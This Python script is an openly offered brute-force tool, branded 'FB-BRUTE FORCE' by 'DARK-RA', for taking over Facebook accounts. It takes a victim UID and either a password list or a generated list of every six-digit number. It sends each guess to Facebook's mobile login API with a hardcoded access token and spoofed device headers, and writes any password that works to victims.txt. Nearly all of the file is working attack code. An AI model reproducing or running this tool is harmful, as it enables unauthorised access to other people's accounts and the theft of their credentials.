
import os, sys, time, random, json, requests, mechanize,datetime
from time import sleep
import requests, sys, os, random, time,json
import webbrowser
#webbrowser.open('https://www.facebook.com/MUHAMMAD.RONI.AKONDO?mibextid=ZbWKwL')
uagent=["Mozilla/5.0 (Linux; Android 10; Redmi Note 8 Pro Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/275.0.0.49.127;]", "[FBAN/FB4A;FBAV/246.0.0.49.121;FBBV/181448449;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBRV/183119516;FBCR/TM;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1606;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]", "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J320F Build/LMY47V) [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-J320F;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]", "Mozilla/5.0 (Linux; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.152 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/305.1.0.40.120;]", "Mozilla/5.0 (Linux; Android 10; REALME RMX1911 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36 AlohaBrowser/2.20.3", "Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E216 [FBAN/FBIOS;FBAV/170.0.0.60.91;FBBV/105964764;FBDV/iPhone10,1;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/2;FBCR/Sprint;FBID/phone;FBLC/en_US;FBOP/5;FBRV/106631002]", "Mozilla/5.0 (Linux; Android 7.1.1; ASUS Chromebook Flip C302 Build/R70-11021.56.0; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Safari/537.36 [FB_IAB/FB4A;FBAV/198.0.0.53.101;]"]
#__________________[ SYS ]__________________#
sys.stdout.write('\x1b]2;)⚜️FB-💀-BRUTE⚜️\x07')
def slow(t):
    for e in t + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        sleep(0.06)

lines="\033[1;34m═\033[1;37m"*50
def banner():
  os.system("clear")
  print("\n\n")
  print(lines)
  print("""
██████╗  █████╗ ██████╗ ██╗  ██╗     ██████╗  █████╗     
██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝     ██╔══██╗██╔══██╗    
██║  ██║███████║██████╔╝█████╔╝█████╗██████╔╝███████║    
██║  ██║██╔══██║██╔══██╗██╔═██╗╚════╝██╔══██╗██╔══██║    
██████╔╝██║  ██║██║  ██║██║  ██╗     ██║  ██║██║  ██║    
╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝    
                                                         
             
   𝐓𝐎𝐎𝐋 𝐍𝐀𝐌𝐄   : \033[1;32mFB-BRUTE FORCE\033[1;37m
   𝐎𝐖𝐍𝐄𝐑 : \033[1;32mDARK-RA 
 𝐅𝐀𝐂𝐄𝐁𝐎𝐊 𝐈𝐃   : \033[1;32mMUHAMMAD.RONI.AKONDO\033[1;37m
  """)
  print(lines)
  upass=input("\n   [•] 🔐𝐄𝐍𝐓𝐄𝐑 𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃🔑: ")
  if upass=="DARK-RA":
    slow("   [•] 🤩𝐏𝐀𝐒𝐒𝐖𝐑𝐃 𝐂𝐎𝐑𝐑𝐂𝐓🔓")
    time.sleep(2)
    mbanner()
    pass
  else:
    print(lines)
    slow("   [•] 😢𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃 𝐖𝐑𝐎𝐍𝐆🔒!!")
    slow("   [•] 🔰𝐅𝐎𝐋𝐋𝐎𝐖 𝐌𝐘 𝐅𝐁 𝐀𝐂𝐂𝐎𝐔𝐍𝐓🔰 | ⚜️    DARK-RA     ⚜️")
    print(lines)
    sys.exit()
  menu()
def mbanner():
  os.system("clear")
  print("\n\n")
  print(lines)
  print("""
██████╗  █████╗ ██████╗ ██╗  ██╗     ██████╗  █████╗     
██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝     ██╔══██╗██╔══██╗    
██║  ██║███████║██████╔╝█████╔╝█████╗██████╔╝███████║    
██║  ██║██╔══██║██╔══██╗██╔═██╗╚════╝██╔══██╗██╔══██║    
██████╔╝██║  ██║██║  ██║██║  ██╗     ██║  ██║██║  ██║    
╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝    
                                                         
             
   𝐓𝐎𝐎𝐋 𝐍𝐀𝐌𝐄   : \033[1;32mFB-BRUTE FORCE\033[1;37m
   𝐎𝐖𝐍𝐄𝐑 : \033[1;32mDARK-RA 
 𝐅𝐀𝐂𝐄𝐁𝐎𝐊 𝐈𝐃   : \033[1;32mMUHAMMAD.RONI.AKONDO\033[1;37m
  """)
def menu():
  print(lines)
  print("""              ⚜️𝐂𝐇𝐎𝐎𝐒𝐄 𝐎𝐍 𝐎𝐏𝐓𝐈𝐎𝐍⚜️
  
   [1] 🔰𝐒𝐓𝐀𝐑𝐓 𝐁𝐑𝐔𝐓𝐄----𝐀𝐓𝐓𝐀𝐂𝐊🔰
   [2] 🔰𝐅𝐎𝐋𝐋𝐎𝐖 𝐌𝐘 𝐅𝐁 𝐀𝐂𝐂𝐎𝐔𝐍𝐓🔰
   [3] 🔰𝐃𝐄𝐕𝐎𝐋𝐄𝐏𝐄𝐑🔰
   [4] 🔰𝐌𝐎𝐑𝐄 𝐓𝐎𝐎𝐋🔰
   [5] 🔰𝐃𝐄𝐋𝐄𝐓 𝐂𝐀𝐂𝐇𝐄🔰
   [6] 🔰𝐄𝐗𝐈𝐓 𝐓𝐎𝐎𝐋🔰""")
  choose()
def choose():
  a=input("\n\n   [>>>] 💀𝐄𝐍𝐓𝐄𝐑 𝐘𝐎𝐔𝐑 𝐎𝐏𝐓𝐈𝐎𝐍❓ : ")
  if a=="1" or a=="01":
    os.system("xdg-open https://www.facebook.com/MUHAMMAD.RONI.AKONDO?mibextid=ZbWKwL")
    pass
  elif a=="2" or a=="02":
    #webbrowser.open('https://www.facebook.com/MUHAMMAD.RONI.AKONDO?mibextid=ZbWKwL')
    sys.exit()
  elif a=="3" or a=="03":
    #webbrowser.open('https://github.com/DARK-RA-cyber?tab=repositories')
    sys.exit()
  elif a=="4" or a=="04":
    print('𝐅𝐎𝐋𝐋𝐎𝐖 𝐌𝐘 𝐅𝐁 𝐀𝐂𝐂𝐎𝐔𝐍𝐓 | MUHAMMAD.RONI.AKONDO')
    sys.exit()
  elif a=="5" or a=="05":
    print(lines)
    slow("     [•] 𝐏𝐋𝐀𝐂𝐄 𝐖𝐀𝐈𝐓 𝐀 𝐌𝐎𝐌𝐄𝐍𝐓")
    slow("     [•] 𝐓𝐑𝐘𝐈𝐍𝐆 𝐓𝐎 𝐑𝐄𝐌𝐎𝐕𝐈𝐍𝐆 𝐀𝐋𝐋 𝐂𝐀𝐂𝐇𝐄....")
    os.system("touch .autopass && touch hacked.txt")
    time.sleep(2)
    os.system("rm .autopass && rm hacked.txt")
    slow("     [•] 𝐀𝐋𝐋 𝐂𝐀𝐂𝐇𝐄 𝐑𝐄𝐌𝐎𝐕𝐄𝐃 𝐒𝐔𝐂𝐂𝐄𝐒𝐅𝐔𝐋𝐋𝐘")
    print(lines)
    sys.exit()
  elif a=="6" or a=="06":
    slow("\n   [•] 𝐄𝐗𝐈𝐓 𝐒𝐔𝐂𝐂𝐄𝐒𝐅𝐔𝐋𝐋𝐘\n")
    sys.exit()
  else:
    slow("\n   [•] 𝐖𝐑𝐎𝐍𝐆 𝐕𝐀𝐋𝐔𝐄 𝐄𝐍𝐓𝐄𝐑𝐄𝐃")
    slow("   [•] 𝐓𝐑𝐘 𝐀𝐆𝐀𝐈𝐍\n")
    menu()
banner()
id=[]
print(lines)
victim = input("   [•] 🔴𝐄𝐍𝐓𝐄𝐑 𝐕𝐈𝐂𝐓𝐈𝐌 𝐔𝐈𝐃🔴: ")
print(lines)
passlist= input("   [•] 🟡𝐏𝐀𝐒𝐒𝐖𝐎𝐄𝐃 𝐋𝐈𝐒𝐓🟡[𝐏𝐋𝐄𝐀𝐒𝐄 𝐄𝐋𝐓𝐄𝐑]🛡️ ")

if passlist == "" or passlist == " " or passlist=="  ":
  fil=".autopass"
  slow("\n   [•] ⏱️𝐏𝐋𝐄𝐀𝐒𝐄 𝐖𝐀𝐈𝐓⏱️")
  slow("   [•] 😏𝐆𝐄𝐍𝐀𝐑𝐄𝐃 𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃 𝐋𝐈𝐒𝐓😏")
  ii = 99999
  f = open(".autopass","w")
  while True:
	  ii += 1
	  f.write(str(ii)+"\n")
	  if ii==1000000:
		  break
  f.close()
  slow("   [•] 🔵𝐏𝐀𝐒𝐒𝐖𝐎𝐄𝐃 𝐋𝐈𝐒𝐓 𝐆𝐄𝐍𝐀𝐑𝐄𝐃🔵")
  print(lines)
  time.sleep(1)
  try:
    tt=open(fil,"r")
    ft=tt.readlines()
    total=len(ft)
    tt.close()
  except:
    slow("   [•] 𝐅𝐈𝐋𝐄 𝐍𝐎𝐓 𝐅𝐎𝐔𝐍𝐃")
    slow("   [•] Try Again")
    sys.exit()
else:
  fil=passlist
  try:
    tt=open(fil,"r")
    ft=tt.readlines()
    total=len(ft)
    tt.close()
  except:
    slow("   [•] 𝐅𝐈𝐋𝐄 𝐍𝐎𝐓 𝐅𝐎𝐔𝐍𝐃")
    slow("   [•] Try Again")
    sys.exit()
mbanner()
now= datetime.datetime.now()
rtime=now.strftime("%H:%M:%S")
print(lines)
print("   [•] 🤍𝐕𝐈𝐂𝐓𝐈𝐌 𝐔𝐈𝐃🤍: "+str(victim))
print("   [•] 🧡𝐓𝐎𝐓𝐀𝐋 𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃🧡: "+str(total))
print("   [•] 💚𝐓𝐑𝐘𝐈𝐍𝐆 𝐅𝐑𝐎𝐌💚: "+fil)
print("   [•] 💙 𝐒𝐀𝐕𝐄 𝐈𝐍💙 victims.txt")
print("   [•] 🕛𝐀𝐓𝐓𝐀𝐂𝐊 𝐓𝐈𝐌𝐄🕛: "+str(rtime))
print(lines)
slow("\n   ⚠️𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓⚠️...........\n")
time.sleep(2)
def crack_file():
  pasw=open(fil,"r")
  for i in range(int(total)):
    try:
      try:
        pw=pasw.readline()
        pw=pw.replace("\n","")
        nagent = random.choice(uagent)
        ses = requests.Session()
        headers = {
      					"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
      					"x-fb-sim-hni": str(random.randint(20000, 40000)), 
      					"x-fb-net-hni": str(random.randint(20000, 40000)), 
      					"x-fb-connection-qunisadty": "EXCELLENT",
      					"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
      					"user-agent": nagent, 
      					"content-type": "application/x-www-form-urlencoded", 
      					"x-fb-http-engine": "Liger"
      				}
        
        response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(victim)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers)
        #print(response.text)
        hnow= datetime.datetime.now()
        htime=hnow.strftime("%H:%M:%S")
        if "session_key" in response.text and "EAAA" in response.text:
      	  #tok= response.json()["access_token"]
      	  #print(response.text)
      	  print(lines)
      	  print("   [•] 🤯𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃 𝐅𝐎𝐔𝐍𝐃🤯")
      	  print("   [•] 😑𝐒𝐓𝐀𝐓𝐔𝐒: 𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋😑")
      	  print("   [•] 🧐𝐔𝐈𝐃🧐: "+victim)
      	  print("   [•] 🤫𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃🤫: "+pw)
      	  save=open("victims.txt","a")
      	  save.write("🤯𝐕𝐈𝐂𝐓𝐈𝐌 𝐅𝐎𝐔𝐍𝐃🤯\nStatus: Successful\nUid: "+victim+"\nPassword: "+str(pw)+"\nAttacking Time: "+rtime+"\nHacked Time: "+htime+"\n\n")
      	  save.close()
      	  print(lines)
      	  break
        elif "www.facebook.com" in response.json()["error_msg"]:
      	  print(lines)
      	  print("   [•] 🤯𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃 𝐅𝐎𝐔𝐍𝐃🤯")
      	  print("   [•] 🥵𝐒𝐓𝐀𝐓𝐔𝐒: 𝐂𝐇𝐄𝐂𝐊𝐏𝐎𝐈𝐍𝐓🥵")
      	  print("   [•] 🧐𝐔𝐈𝐃🧐: "+victim)
      	  print("   [•] 🤫𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃🤫: "+pw)
      	  save=open("victims.txt","a")
      	  save.write("🔰𝐕𝐈𝐂𝐓𝐈𝐌 𝐅𝐎𝐔𝐍𝐃🔰\nStatus: Checkpoint\nUid: "+victim+"\nPassword: "+str(pw)+"\nAttacking Time: "+rtime+"\nHacked Time: "+htime+"\n\n")
      	  save.close()
      	  print(lines)
      	  break
        else:
          print("\033[1;37m   ["+str(i)+"] ☢️𝐖𝐑𝐎𝐍𝐆 𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃☢️:\033[1;31m "+str(pw)+"\033[1;37m")
          
      except requests.exceptions.RequestException:
        print("\n\033[1;37m   Failed\n  😭 ᑎᗯTOᖇK ᑭᖇOᗷᒪᗴᗰ😭\033[1;37m\n")
    except:pass
  #print(lines)
  #print("   [•] Password Not Found")
  #print("   [•] Try Again With A Strong Password List")
  #print(lines)
crack_file()
"""
        print("Password Found")
        print("Status: Successful")
        print("Uid: "+victim)
        print("Password: "+pwd)
"""
